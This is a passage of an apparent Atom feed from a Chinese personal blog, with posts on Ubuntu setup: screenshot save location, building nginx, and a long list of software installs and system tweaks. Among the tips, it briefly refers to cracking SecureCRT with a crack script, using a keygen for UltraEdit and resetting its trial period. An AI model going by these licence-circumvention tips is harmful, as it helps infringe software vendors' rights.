    <category term="系统配置" scheme="http://yeshaoting.cn/categories/%E7%B3%BB%E7%BB%9F%E9%85%8D%E7%BD%AE/"/>
    
    
    <category term="ubuntu" scheme="http://yeshaoting.cn/tags/ubuntu/"/>
    
    <category term="五笔" scheme="http://yeshaoting.cn/tags/%E4%BA%94%E7%AC%94/"/>
    
  </entry>
  
  <entry>
    <title>Ubuntu更改截图默认保存位置</title>
    <link href="http://yeshaoting.cn/article/linux/Ubuntu%E6%9B%B4%E6%94%B9%E6%88%AA%E5%9B%BE%E9%BB%98%E8%AE%A4%E4%BF%9D%E5%AD%98%E4%BD%8D%E7%BD%AE/"/>
    <id>http://yeshaoting.cn/article/linux/Ubuntu%E6%9B%B4%E6%94%B9%E6%88%AA%E5%9B%BE%E9%BB%98%E8%AE%A4%E4%BF%9D%E5%AD%98%E4%BD%8D%E7%BD%AE/</id>
    <published>2015-12-29T05:58:00.000Z</published>
    <updated>2021-07-01T04:25:31.000Z</updated>
    
    <content type="html"><![CDATA[<img src="/asserts/images/logo/ubuntu.png" class="img-logo img-center" /><h2 id="图形界面"><a href="#图形界面" class="headerlink" title="图形界面"></a>图形界面</h2><p>安装dconf-editor</p><blockquote><p>sudo apt-get install dconf-editor</p></blockquote><p>打开dconf-editor，进入org -&gt; gnome -&gt; gnome-screenshot，修改auto-save-directory值为 file:///home/yeshaoting/Pictures/screenshot/。</p><h2 id="命令行"><a href="#命令行" class="headerlink" title="命令行"></a>命令行</h2><blockquote><p>gsettings set org.gnome.gnome-screenshot auto-save-directory “file:///home/yeshaoting/Pictures/screenshot/“</p></blockquote><h2 id="参考文档"><a href="#参考文档" class="headerlink" title="参考文档"></a>参考文档</h2><p><a href="http://askubuntu.com/a/134469">Default save directory for gnome-screenshot?</a></p>]]></content>
    
    
      
      
    <summary type="html">&lt;img src=&quot;/asserts/images/logo/ubuntu.png&quot; class=&quot;img-logo img-center&quot; /&gt;


&lt;h2 id=&quot;图形界面&quot;&gt;&lt;a href=&quot;#图形界面&quot; class=&quot;headerlink&quot; title=&quot;图形界面&quot;&gt;&lt;/</summary>
      
    
    
    
    <category term="系统配置" scheme="http://yeshaoting.cn/categories/%E7%B3%BB%E7%BB%9F%E9%85%8D%E7%BD%AE/"/>
    
    
    <category term="ubuntu" scheme="http://yeshaoting.cn/tags/ubuntu/"/>
    
  </entry>
  
  <entry>
    <title>linux安装nginx</title>
    <link href="http://yeshaoting.cn/article/linux/linux%E5%AE%89%E8%A3%85nginx/"/>
    <id>http://yeshaoting.cn/article/linux/linux%E5%AE%89%E8%A3%85nginx/</id>
    <published>2015-12-29T05:58:00.000Z</published>
    <updated>2021-07-01T04:25:31.000Z</updated>
    
    <content type="html"><![CDATA[<p>Nginx服务器的安装配置</p><h2 id="一、下载并解压安装包"><a href="#一、下载并解压安装包" class="headerlink" title="一、下载并解压安装包"></a>一、下载并解压安装包</h2><p>下载地址：<a href="http://nginx.org/en/download.html">http://nginx.org/en/download.html</a></p><blockquote><p>tar -zxvf nginx-x.x.xx.tar.gz （x.x.xx：为版本号）</p></blockquote><h2 id="二、编译"><a href="#二、编译" class="headerlink" title="二、编译"></a>二、编译</h2><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">cd nginx-x.x.xx</span><br><span class="line">./configure --with-http_stub_status_module --prefix=/home/yeshaoting/java/server/nginx/nginx-1.8.0 --without-http_rewrite_module --without-http_gzip_module</span><br></pre></td></tr></table></figure><h2 id="三、参考文档"><a href="#三、参考文档" class="headerlink" title="三、参考文档"></a>三、参考文档</h2><p><a href="http://minitoo.blog.51cto.com/4201040/850654">Nginx服务器的安装配置</a></p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;Nginx服务器的安装配置&lt;/p&gt;
&lt;h2 id=&quot;一、下载并解压安装包&quot;&gt;&lt;a href=&quot;#一、下载并解压安装包&quot; class=&quot;headerlink&quot; title=&quot;一、下载并解压安装包&quot;&gt;&lt;/a&gt;一、下载并解压安装包&lt;/h2&gt;&lt;p&gt;下载地址：&lt;a href=&quot;htt</summary>
      
    
    
    
    <category term="工具软件" scheme="http://yeshaoting.cn/categories/%E5%B7%A5%E5%85%B7%E8%BD%AF%E4%BB%B6/"/>
    
    
    <category term="ubuntu" scheme="http://yeshaoting.cn/tags/ubuntu/"/>
    
    <category term="nginx" scheme="http://yeshaoting.cn/tags/nginx/"/>
    
  </entry>
  
  <entry>
    <title>ubuntu装机软件</title>
    <link href="http://yeshaoting.cn/article/linux/ubuntu%E8%A3%85%E6%9C%BA%E8%BD%AF%E4%BB%B6/"/>
    <id>http://yeshaoting.cn/article/linux/ubuntu%E8%A3%85%E6%9C%BA%E8%BD%AF%E4%BB%B6/</id>
    <published>2015-12-29T05:58:00.000Z</published>
    <updated>2021-07-01T04:25:31.000Z</updated>
    
    <content type="html"><![CDATA[<img src="/asserts/images/logo/ubuntu.png" class="img-logo img-center" /><p>修改软件源为163的源。</p><h2 id="一、应用软件"><a href="#一、应用软件" class="headerlink" title="一、应用软件"></a>一、应用软件</h2><h3 id="1-安装vim"><a href="#1-安装vim" class="headerlink" title="1. 安装vim"></a>1. 安装vim</h3><p>命令：</p><blockquote><p>sudo apt-get install vim</p></blockquote><h3 id="2-chrome"><a href="#2-chrome" class="headerlink" title="2. chrome"></a>2. chrome</h3><p>直接登录官方网站下载deb包。<br><a href="https://www.google.com/intl/zh-CN/chrome/browser/">https://www.google.com/intl/zh-CN/chrome/browser/</a></p><p><strong>注</strong>：由于访问google需要翻墙，可以暂时下载百度网盘里的旧版本。</p><h3 id="3-截图工具shutter"><a href="#3-截图工具shutter" class="headerlink" title="3. 截图工具shutter"></a>3. 截图工具shutter</h3><p>ubuntu软件中心可下载。</p><p>14.04的shutter不提供自定义快捷键，可以利用系统自带的键盘快捷键设置来达到目的。</p><p><strong>设置自定义快捷键方法</strong>：设置 -&gt; 键盘 -&gt; 快捷键 -&gt; 自定义快捷键</p><p>命令：</p><blockquote><p>shutter -s</p></blockquote><p><strong>注</strong>：系统自带的截图工具也不错。</p><span id="more"></span><h3 id="4-unity-tweak-tool"><a href="#4-unity-tweak-tool" class="headerlink" title="4. unity-tweak-tool"></a>4. unity-tweak-tool</h3><p>unity桌面配置工具, ubuntu软件中心可下载。</p><p>命令：</p><blockquote><p>sudo apt-get install unity-tweak-tool</p></blockquote><h3 id="5-极点五笔输入法"><a href="#5-极点五笔输入法" class="headerlink" title="5. 极点五笔输入法"></a>5. 极点五笔输入法</h3><p>使用系统自带的极点五笔输入法<br>14.04的ibus与系统软件捆绑，ibus坏了，可能导致系统崩溃。慎装，更加不要做任何删除ibus操作。</p><h3 id="6-安装gnome-panel"><a href="#6-安装gnome-panel" class="headerlink" title="6. 安装gnome-panel"></a>6. 安装gnome-panel</h3><p>gnome面板工具，包含 <strong>gnome-desktop-item-edit</strong> 命令，用于创建桌面图标。</p><p>命令：</p><blockquote><p>sudo apt-get install gnome-panel</p></blockquote><p>例如：</p><blockquote><p><code>gnome-desktop-item-edit ~/Desktop/ --create-new</code><br>gnome-desktop-item-edit ~/Desktop/app.desktop</p></blockquote><h3 id="7-百度准入go-bnac"><a href="#7-百度准入go-bnac" class="headerlink" title="7. 百度准入go-bnac"></a>7. 百度准入go-bnac</h3><p>百度网盘里应该有。<br>在百度工作专用，用于linux环境下连接百度准入。</p><h3 id="8-bcompare"><a href="#8-bcompare" class="headerlink" title="8. bcompare"></a>8. bcompare</h3><p>安装包，百度网盘有。<br><strong>注</strong>：依赖ia32-libs</p><h3 id="9-RabbitVCS"><a href="#9-RabbitVCS" class="headerlink" title="9. RabbitVCS"></a>9. RabbitVCS</h3><p>安装步骤：</p><blockquote><p>sudo add-apt-repository ppa:rabbitvcs/ppa<br>sudo apt-get update<br>sudo apt-get install rabbitvcs-core rabbitvcs-cli rabbitvcs-nautilus3 rabbitvcs-gedit</p></blockquote><p><strong>说明</strong>：重启文档管理器，使用rabbitvcs-nautilus3生效。</p><blockquote><p>nautilus -q</p></blockquote><p><strong>注</strong>：不同的系统版本可能需要替换 rabbitvcs-nautilus3 为 rabbitvcs-nautilus 。另外，rabbitvcs-gedit 如无需要的话，可以不安装。</p><p><strong>参考</strong>：<a href="http://www.elain.org/?p=742">ubuntu软件—RabbitVCS : TortoiseSVN 的替代者</a></p><h3 id="10-VPN工具"><a href="#10-VPN工具" class="headerlink" title="10. VPN工具"></a>10. VPN工具</h3><p>优先使用cisco Anyconnect VPN Tool。</p><p>如果连接不成功，则可以考虑安装openconnect。<br>安装命令：</p><blockquote><p>sudo apt-get install network-manager-openconnect-gnome</p></blockquote><p>连接VPN命令：</p><blockquote><p>sudo openconnect vpn.sohu-inc.com</p></blockquote><h3 id="11-右键在当前位置打开终端"><a href="#11-右键在当前位置打开终端" class="headerlink" title="11. 右键在当前位置打开终端"></a>11. 右键在当前位置打开终端</h3><p>命令：</p><blockquote><p>sudo apt-get install nautilus-open-terminal</p></blockquote><p><strong>注</strong>：安装完成后，需要重启文件管理器</p><blockquote><p>nautilus -q</p></blockquote><h3 id="12-设置chrome代理"><a href="#12-设置chrome代理" class="headerlink" title="12. 设置chrome代理"></a>12. 设置chrome代理</h3><p><strong>百度工作</strong>：使用chrome插件 <strong>Proxy SwitchySharp</strong> 加载公司代理配置。<br><strong>搜狐工作</strong>：购买红杏网页浏览代理服务，并下载红杏chrome插件使用。</p><h3 id="13-ubuntu打印机"><a href="#13-ubuntu打印机" class="headerlink" title="13. ubuntu打印机"></a>13. ubuntu打印机</h3><p><strong>百度工作</strong>：<br>参考<a href="http://wiki.babel.baidu.com/twiki/bin/view/Com/Pmo/Iit/Babel/Ubuntu%E5%AE%89%E8%A3%85%E5%85%AC%E5%8F%B8%E6%89%93%E5%8D%B0%E6%9C%BA">http://wiki.babel.baidu.com/twiki/bin/view/Com/Pmo/Iit/Babel/Ubuntu%E5%AE%89%E8%A3%85%E5%85%AC%E5%8F%B8%E6%89%93%E5%8D%B0%E6%9C%BA</a></p><h3 id="14-经典菜单classicmenu-indicator"><a href="#14-经典菜单classicmenu-indicator" class="headerlink" title="14. 经典菜单classicmenu-indicator"></a>14. 经典菜单classicmenu-indicator</h3><p>ubuntu软件中心有下载。</p><p>命令：</p><blockquote><p><code>sudo apt-get install --fix-missing classicmenu-indicator</code></p></blockquote><h3 id="15-rar-zip格式压缩工具"><a href="#15-rar-zip格式压缩工具" class="headerlink" title="15. rar/zip格式压缩工具"></a>15. rar/zip格式压缩工具</h3><p>压缩&amp;解压功能，能与ubuntu自带的归档管理器集成。</p><p>安装命令：</p><blockquote><p>sudo apt-get install rar unrar p7zip-full</p></blockquote><p>卸载命令：</p><blockquote><p>sudo apt-get remove rar unrar p7zip-full</p></blockquote><h3 id="16-chmsee"><a href="#16-chmsee" class="headerlink" title="16. chmsee"></a>16. chmsee</h3><p>命令：</p><blockquote><p>sudo apt-get install chmsee</p></blockquote><p>软件源里可能没有chmsee，网上有已经打包好的deb包。<br><strong>注</strong>：由于ubuntu14.04软件库未提供命令下载，网上有已经打包好的deb包。百度网盘里有下载好的64位chmsee：chmsee_1.3.1.1-1~getdeb2_amd64.deb</p><p><strong>参考</strong>：<a href="http://pkgs.org/ubuntu-14.04/getdeb-apps-amd64/chmsee_1.3.1.1-1~getdeb2_amd64.deb.html">chmsee_1.3.1.1-1~getdeb2_amd64.deb</a></p><h3 id="17-virtualbox"><a href="#17-virtualbox" class="headerlink" title="17. virtualbox"></a>17. virtualbox</h3><p>命令：</p><blockquote><p>sudo apt-get install virtualbox-qt</p></blockquote><h3 id="18-LONGENE-QQ2013"><a href="#18-LONGENE-QQ2013" class="headerlink" title="18. LONGENE QQ2013"></a>18. LONGENE QQ2013</h3><p><strong>前提条件</strong>：64位系统需要安装ia32-libs</p><p>安装步骤：</p><blockquote><p>deb <a href="http://archive.ubuntu.com/ubuntu/">http://archive.ubuntu.com/ubuntu/</a> raring main restricted universe multiverse<br>sudo apt-get update<br>sudo apt-get install ia32-libs<br>sudo dpkg -i WineQQ2013-20131120-Longene.deb</p></blockquote><p><strong>注</strong>：WineQQ2012-20121221-Longene.deb已经不让用，而新版本WineQQ2013SP6-20140102-Longene.deb界面又有问题。可以考虑使用webqq + 虚拟机的方式工作。</p><p><strong>参考</strong>：<a href="http://www.longene.org/forum/viewtopic.php?t=4700">wine qq 2013 for linux Ubuntu 64位兼容</a></p><h3 id="19-markdown编辑器haroopad"><a href="#19-markdown编辑器haroopad" class="headerlink" title="19. markdown编辑器haroopad"></a>19. markdown编辑器haroopad</h3><p><strong>下载地址</strong>：<a href="http://pad.haroopress.com/user.html">http://pad.haroopress.com/user.html</a></p><h3 id="20-wps-office"><a href="#20-wps-office" class="headerlink" title="20. wps-office"></a>20. wps-office</h3><p><strong>下载地址</strong>：<a href="http://linux.wps.cn/">http://linux.wps.cn/</a></p><p>安装字体管理器命令：</p><blockquote><p>sudo apt-get install font-manager</p></blockquote><p><strong>注</strong>：字体安装有问题，过程可能需要执行exe程序，比较坑，建议不使用需要的字段。(使用过程不会报错)</p><h3 id="21-有道词典"><a href="#21-有道词典" class="headerlink" title="21. 有道词典"></a>21. 有道词典</h3><p><strong>下载地址</strong>：<a href="http://cidian.youdao.com/index-linux.html">http://cidian.youdao.com/index-linux.html</a></p><p><strong>说明</strong>：<br>使用过程发现会系统出现卡顿的现象。所以，不使用时，最好关闭客户端。<br>英文发音有问题。</p><h3 id="22-flashplayer独立播放器"><a href="#22-flashplayer独立播放器" class="headerlink" title="22. flashplayer独立播放器"></a>22. flashplayer独立播放器</h3><p><strong>下载地址</strong>：<a href="http://fpdownload.macromedia.com/pub/flashplayer/updaters/11/flashplayer_11_sa.i386.tar.gz">http://fpdownload.macromedia.com/pub/flashplayer/updaters/11/flashplayer_11_sa.i386.tar.gz</a></p><h3 id="23-切换默认的shell版本"><a href="#23-切换默认的shell版本" class="headerlink" title="23. 切换默认的shell版本"></a>23. 切换默认的shell版本</h3><blockquote><p>sudo dpkg-reconfigure dash</p></blockquote><p><strong>参考</strong>：<a href="http://blog.csdn.net/breeze5428/article/details/27353583">Shell编程笔记——Syntax error: “(“ unexpected</a></p><h3 id="24-百度网盘linux版"><a href="#24-百度网盘linux版" class="headerlink" title="24. 百度网盘linux版"></a>24. 百度网盘linux版</h3><p>Debian及基于Debian的发行版(比如ubuntu, linuxmint)请直接下载 bcloud-x.x.x.deb这个包, 然后双击deb包就能安装了;<br>有些用户并没有安装apt包管理器的GUI界面, 也可以在终端里面安装:</p><blockquote><p>$ sudo dpkg -i bcloud-x.x.x.deb<br>$ sudo apt-get -f install</p></blockquote><p><strong>参考</strong>：<br><a href="https://github.com/LiuLang/bcloud">https://github.com/LiuLang/bcloud</a><br><a href="https://github.com/LiuLang/bcloud-packages">https://github.com/LiuLang/bcloud-packages</a></p><h3 id="25-Ubuntu-14-04-64位字体美化-使用文泉驿微黑"><a href="#25-Ubuntu-14-04-64位字体美化-使用文泉驿微黑" class="headerlink" title="25. Ubuntu 14.04 64位字体美化(使用文泉驿微黑)"></a>25. Ubuntu 14.04 64位字体美化(使用文泉驿微黑)</h3><blockquote><p>sudo aptitude install ttf-wqy-microhei</p></blockquote><p><strong>参考</strong>：<a href="http://blog.csdn.net/tao_627/article/details/24180781">Ubuntu 14.04 64位字体美化(使用文泉驿微黑)</a></p><h3 id="26-安装gstreamer0-10-ffmpeg"><a href="#26-安装gstreamer0-10-ffmpeg" class="headerlink" title="26. 安装gstreamer0.10-ffmpeg"></a>26. 安装gstreamer0.10-ffmpeg</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">sudo add-apt-repository ppa:mc3man/trusty-media</span><br><span class="line">sudo apt-get update</span><br><span class="line">sudo apt-get install gstreamer0.10-ffmpeg</span><br></pre></td></tr></table></figure><p><strong>参考</strong>：[Ubuntu 14.04如何轻松启用H.264视频支持][11]</p><h3 id="27-安装curl"><a href="#27-安装curl" class="headerlink" title="27. 安装curl"></a>27. 安装curl</h3><blockquote><p>sudo apt-get install curl</p></blockquote><h2 id="二、开发软件"><a href="#二、开发软件" class="headerlink" title="二、开发软件"></a>二、开发软件</h2><h3 id="1-安装git"><a href="#1-安装git" class="headerlink" title="1. 安装git"></a>1. 安装git</h3><p>命令：</p><blockquote><p>sudo apt-get install git</p></blockquote><h3 id="2-securecrt"><a href="#2-securecrt" class="headerlink" title="2. securecrt"></a>2. securecrt</h3><p>securecrt(使用securecrt_linux_crack.pl破解时，需要切换到root用户操作：su root)</p><h3 id="3-subversion"><a href="#3-subversion" class="headerlink" title="3. subversion"></a>3. subversion</h3><p><strong>注</strong>：可能安装rabbitvcs时已经安装</p><p>命令：</p><blockquote><p>sudo apt-get install subversion<br>sudo apt-get install libapache2-svn</p></blockquote><h3 id="4-安装mysql"><a href="#4-安装mysql" class="headerlink" title="4. 安装mysql"></a>4. 安装mysql</h3><p>命令：</p><blockquote><p>sudo apt-get install mysql-server<br>sudo apt-get install mysql-workbench</p></blockquote><h3 id="5-java"><a href="#5-java" class="headerlink" title="5. java"></a>5. java</h3><p>下载jdk bin或者tar.gz包，并安装。</p><p>修改java配置 ~/.profile</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">JAVA_HOME=/home/yeshaoting/java/jdk/jdk1.7.0_51</span><br><span class="line">CLASSPATH=$JAVA_HOME/jre/lib</span><br><span class="line">PATH=$PATH:$JAVA_HOME/bin</span><br><span class="line">export JAVA_HOME CLASSPATH PATH</span><br></pre></td></tr></table></figure><h3 id="6-eclipse／STS"><a href="#6-eclipse／STS" class="headerlink" title="6. eclipse／STS"></a>6. eclipse／STS</h3><p><strong>最新的STS下载地址</strong>：<a href="http://spring.io/tools/sts/">http://spring.io/tools/sts/</a></p><h3 id="7-maven"><a href="#7-maven" class="headerlink" title="7. maven"></a>7. maven</h3><h2 id="三、系统配置"><a href="#三、系统配置" class="headerlink" title="三、系统配置"></a>三、系统配置</h2><h3 id="1-设置root密码"><a href="#1-设置root密码" class="headerlink" title="1. 设置root密码"></a>1. 设置root密码</h3><p>命令：</p><blockquote><p>sudo passwd root</p></blockquote><h3 id="2-合上笔记本不休眠"><a href="#2-合上笔记本不休眠" class="headerlink" title="2. 合上笔记本不休眠"></a>2. 合上笔记本不休眠</h3><p>编辑/etc/default/acpi-support<br>找到内容：LOCK_SCREEN=true，并修改为：LOCK_SCREEN=false</p><h3 id="3-中文语言支持"><a href="#3-中文语言支持" class="headerlink" title="3. 中文语言支持"></a>3. 中文语言支持</h3><h3 id="4-用户目录英文名"><a href="#4-用户目录英文名" class="headerlink" title="4. 用户目录英文名"></a>4. 用户目录英文名</h3><p>中文ubuntu里用户目录里的路径改成英文</p><p>执行命令：</p><blockquote><p>export LANG=en_US<br>xdg-user-dirs-gtk-update</p></blockquote><p>接下来，会跳出对话框询问：是否将目录转化为英文路径，同意并关闭。<br>在终端中输入命令：export LANG=zh_CN<br>关闭终端，并重起。下次进入系统，系统会提示是否把转化好的目录改回中文。<br>选择不再提示，并取消修改。<br>主目录的中文转英文就完成了~</p><h3 id="5-自动挂载windows分区"><a href="#5-自动挂载windows分区" class="headerlink" title="5. 自动挂载windows分区"></a>5. 自动挂载windows分区</h3><p>查看硬盘的分区情况：<br><code>df -h</code> 或者 <code>sudo fdisk -l</code> 或者使用GParted分区编辑器查看。</p><p>编辑/etc/fstab文件，添加如下内容：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash"> auto mount C disk</span></span><br><span class="line">/dev/sda1 /home/yeshaoting/windows/C ntfs-3g defaults,locale=zh_CN.UTF-8,umask=022 0 0</span><br><span class="line"><span class="meta"></span></span><br><span class="line"><span class="meta">#</span><span class="bash"> auto mount D disk</span></span><br><span class="line">/dev/sda5 /home/yeshaoting/windows/D ntfs-3g defaults,locale=zh_CN.UTF-8,umask=0,uid=1000,gid=1000 0 0</span><br><span class="line"><span class="meta"></span></span><br><span class="line"><span class="meta">#</span><span class="bash"> auto mount E disk</span></span><br><span class="line">/dev/sda6 /home/yeshaoting/windows/E ntfs-3g defaults,locale=zh_CN.UTF-8,umask=0,uid=1000,gid=1000 0 0</span><br></pre></td></tr></table></figure><p><strong>说明</strong>：umask=022表示只读，umask=0表示可读写，uid和gid设置所属权限（可以通过id username命令）。</p><h3 id="6-Eclipse设置-Javadoc背景色"><a href="#6-Eclipse设置-Javadoc背景色" class="headerlink" title="6. Eclipse设置 Javadoc背景色"></a>6. Eclipse设置 Javadoc背景色</h3><p>命令：</p><blockquote><p>cd /usr/share/themes/Ambiance/gtk-2.0<br>sudo gedit gtkrc</p></blockquote><p>最终12.04及14.04修改gtkrc文件内容如下：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gtk-color-scheme = &quot;base_color:#C7EDCC\nfg_color:#4c4c4c\ntooltip_fg_color:#000000\nselected_bg_color:#f07746\nselected_fg_color:#FFFFFF\ntext_color:#3C3C3C\nbg_color:#f6f4f2\ntooltip_bg_color:#f2edbc\nlink_color:#DD4814&quot;</span><br></pre></td></tr></table></figure><p><strong>参考</strong>：<a href="http://blog.csdn.net/qxb1229/article/details/8265616">Ubuntu 12.04 Eclipse设置 Javadoc背景色</a></p><h3 id="7-thundbird-exchange插件ExQuilla"><a href="#7-thundbird-exchange插件ExQuilla" class="headerlink" title="7. thundbird exchange插件ExQuilla"></a>7. thundbird exchange插件ExQuilla</h3><h2 id="四、软件储备"><a href="#四、软件储备" class="headerlink" title="四、软件储备"></a>四、软件储备</h2><h3 id="1-Ubuntu下的阿里旺旺软件"><a href="#1-Ubuntu下的阿里旺旺软件" class="headerlink" title="1. Ubuntu下的阿里旺旺软件"></a>1. Ubuntu下的阿里旺旺软件</h3><p>阿里旺旺的 Ubuntu 下的版本，下载地址是：<a href="http://ge.tt/8sPpGIA">http://ge.tt/8sPpGIA</a><br><strong>注</strong>：百度网盘里有。</p><p>如遇无法登陆的情况，解除登陆限制即可。</p><p><strong>参考</strong>：<a href="http://wowubuntu.com/aliwangwang.html">http://wowubuntu.com/aliwangwang.html</a></p><h3 id="3-UltraEdit"><a href="#3-UltraEdit" class="headerlink" title="3.UltraEdit"></a>3.UltraEdit</h3><p>下载页面：<a href="http://www.ultraedit.com/downloads/uex.html">http://www.ultraedit.com/downloads/uex.html</a><br>下载地址：<a href="http://www.ultraedit.com/files/uex/Ubuntu/">http://www.ultraedit.com/files/uex/Ubuntu/</a><br><strong>注</strong>：百度网盘里有。</p><h4 id="关于破解"><a href="#关于破解" class="headerlink" title="关于破解"></a>关于破解</h4><ol><li>下载破解器：keygen_ue(百度网盘里有)</li><li>删除配置目录：~/.idm/uex/uex.conf</li></ol><p><strong>参考</strong>：<br><a href="http://mjzhou.com/?p=158">UltraEdit for Linux破解</a><br><a href="http://blog.itpub.net/12216142/viewspace-708801">UltraEdit for linux 不断试用30天的方法 </a></p><h3 id="4-UltraCompareX"><a href="#4-UltraCompareX" class="headerlink" title="4. UltraCompareX"></a>4. UltraCompareX</h3><p>下载页面：<a href="http://www.ultraedit.com/downloads/ucx.html">http://www.ultraedit.com/downloads/ucx.html</a><br>下载地址：<a href="http://www.ultraedit.com/files/ucx/Ubuntu/">http://www.ultraedit.com/files/ucx/Ubuntu/</a></p><p><strong>注</strong>：百度网盘里有。</p><h3 id="5-飞鸽传书GNU-Linux版"><a href="#5-飞鸽传书GNU-Linux版" class="headerlink" title="5. 飞鸽传书GNU/Linux版"></a>5. 飞鸽传书GNU/Linux版</h3><p>命令：</p><blockquote><p>sudo apt-get install iptux</p></blockquote><p>下载地址：<a href="https://code.google.com/p/iptux/downloads/list">https://code.google.com/p/iptux/downloads/list</a></p><p><strong>参考</strong>：<a href="http://wiki.deepin.org/index.php?title=%E4%BF%A1%E4%BD%BF">信使</a></p><h3 id="6-winusb"><a href="#6-winusb" class="headerlink" title="6. winusb"></a>6. winusb</h3><p>安装命令：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">sudo add-apt-repository ppa:colingille/freshlight</span><br><span class="line">sudo apt-get update</span><br><span class="line">sudo apt-get install winusb</span><br></pre></td></tr></table></figure><p><strong>参考</strong>：<a href="http://wiki.deepin.org/index.php?title=WinUSB">WinUSB</a></p><h3 id="7-kwplayer"><a href="#7-kwplayer" class="headerlink" title="7. kwplayer"></a>7. kwplayer</h3><p>需要下载 python3-xlib_xx.deb, python3-keybinder_xx.deb, kwplayer_xx.deb 这 三个软件包. 直接双击就能安装deb包.<br>先安装python3-xlib, 之后是python3-keybinder, 最后是kwplayer.<br>当然, 也可以在终端里安装, 比如:</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sudo dpkg -i kwplayer_xx.deb</span><br><span class="line">sudo apt-get -f install</span><br></pre></td></tr></table></figure><p><strong>参考</strong>：<br><a href="https://github.com/LiuLang/kwplayer">https://github.com/LiuLang/kwplayer</a><br><a href="https://github.com/LiuLang/kwplayer-packages">https://github.com/LiuLang/kwplayer-packages</a></p><h3 id="8-Folder-Color"><a href="#8-Folder-Color" class="headerlink" title="8. Folder Color"></a>8. Folder Color</h3><p>该软件已经集成到Ubuntu 15.04默认库中。<br>ubuntu14或ubuntu12想要安装此软件的话，需要额外添加软件库。</p><p>安装命令如下：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">sudo add-apt-repository ppa:costales/folder-color</span><br><span class="line">sudo apt-get update</span><br><span class="line">sudo apt-get install folder-color</span><br><span class="line">nautilus -q</span><br></pre></td></tr></table></figure><p><strong>参考</strong>：<a href="http://imcn.me/html/y2015/23176.html">Folder Color 已添加到 Ubuntu 15.04 默认库中</a></p><h3 id="ubuntu截图默认保存位置"><a href="#ubuntu截图默认保存位置" class="headerlink" title="ubuntu截图默认保存位置"></a>ubuntu截图默认保存位置</h3><p><strong>参考</strong>：<a href="http://askubuntu.com/a/134469">Default save directory for gnome-screenshot?</a></p>]]></content>
    
    
    <summary type="html">&lt;img src=&quot;/asserts/images/logo/ubuntu.png&quot; class=&quot;img-logo img-center&quot; /&gt;


&lt;p&gt;修改软件源为163的源。&lt;/p&gt;
&lt;h2 id=&quot;一、应用软件&quot;&gt;&lt;a href=&quot;#一、应用软件&quot; class=&quot;headerlink&quot; title=&quot;一、应用软件&quot;&gt;&lt;/a&gt;一、应用软件&lt;/h2&gt;&lt;h3 id=&quot;1-安装vim&quot;&gt;&lt;a href=&quot;#1-安装vim&quot; class=&quot;headerlink&quot; title=&quot;1. 安装vim&quot;&gt;&lt;/a&gt;1. 安装vim&lt;/h3&gt;&lt;p&gt;命令：&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;sudo apt-get install vim&lt;/p&gt;
&lt;/blockquote&gt;
&lt;h3 id=&quot;2-chrome&quot;&gt;&lt;a href=&quot;#2-chrome&quot; class=&quot;headerlink&quot; title=&quot;2. chrome&quot;&gt;&lt;/a&gt;2. chrome&lt;/h3&gt;&lt;p&gt;直接登录官方网站下载deb包。&lt;br&gt;&lt;a href=&quot;https://www.google.com/intl/zh-CN/chrome/browser/&quot;&gt;https://www.google.com/intl/zh-CN/chrome/browser/&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;注&lt;/strong&gt;：由于访问google需要翻墙，可以暂时下载百度网盘里的旧版本。&lt;/p&gt;
&lt;h3 id=&quot;3-截图工具shutter&quot;&gt;&lt;a href=&quot;#3-截图工具shutter&quot; class=&quot;headerlink&quot; title=&quot;3. 截图工具shutter&quot;&gt;&lt;/a&gt;3. 截图工具shutter&lt;/h3&gt;&lt;p&gt;ubuntu软件中心可下载。&lt;/p&gt;
&lt;p&gt;14.04的shutter不提供自定义快捷键，可以利用系统自带的键盘快捷键设置来达到目的。&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;设置自定义快捷键方法&lt;/strong&gt;：设置 -&amp;gt; 键盘 -&amp;gt; 快捷键 -&amp;gt; 自定义快捷键&lt;/p&gt;
&lt;p&gt;命令：&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;shutter -s&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;&lt;strong&gt;注&lt;/strong&gt;：系统自带的截图工具也不错。&lt;/p&gt;</summary>
    
    
    
    <category term="工具软件" scheme="http://yeshaoting.cn/categories/%E5%B7%A5%E5%85%B7%E8%BD%AF%E4%BB%B6/"/>
    
    
    <category term="小记" scheme="http://yeshaoting.cn/tags/%E5%B0%8F%E8%AE%B0/"/>
    
    <category term="ubuntu" scheme="http://yeshaoting.cn/tags/ubuntu/"/>
    
    <category term="装机" scheme="http://yeshaoting.cn/tags/%E8%A3%85%E6%9C%BA/"/>
    
  </entry>
  
  <entry>
    <title>借助fiddler抓包</title>
    <link href="http://yeshaoting.cn/article/linux/%E5%80%9F%E5%8A%A9fiddler%E6%8A%93%E5%8C%85/"/>
    <id>http://yeshaoting.cn/article/linux/%E5%80%9F%E5%8A%A9fiddler%E6%8A%93%E5%8C%85/</id>
